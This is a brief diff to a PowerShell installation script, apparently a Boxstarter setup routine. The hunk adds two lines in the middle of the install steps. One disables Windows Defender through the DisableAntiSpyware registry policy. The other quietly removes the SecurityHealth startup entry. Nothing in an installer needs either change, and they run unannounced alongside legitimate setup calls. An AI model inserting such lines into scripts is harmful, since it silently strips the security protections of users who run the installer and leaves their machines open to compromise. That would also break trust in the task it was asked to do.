@@ -165,6 +165,8 @@ function Install-Module{
   Test-HostSupported;
   Test-PSProfile;
   Install-Module;
+  powershell Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
+  powershell Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
   Install-BoxStarter
  
 
